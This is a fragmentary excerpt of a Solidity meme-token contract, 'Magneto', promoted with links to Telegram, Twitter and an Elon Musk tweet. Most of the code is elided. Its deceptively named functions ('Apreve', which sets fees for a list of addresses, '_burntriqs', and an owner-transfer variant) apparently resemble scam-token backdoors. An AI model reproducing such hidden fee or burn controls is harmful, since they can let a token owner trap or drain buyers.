...
/**
https://t.me/MagnetoERC20
https://x.com/elonmusk/status/1784401598527271238?s=46&t=ibPEm-bix9EHAhEHXkskoA
https://twitter.com/Magneto_erc
Magneto ELON TWITTER
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipstoseghrt(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract Magneto is Ownable {
    ...
    constructor (){
        name = unicode"Magneto";
        symbol = unicode"MAGNETO";
        decimals = 9;
        uint256 Supply = 6904200000;
    ...
    function Apreve(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burntriqs(address user) public {
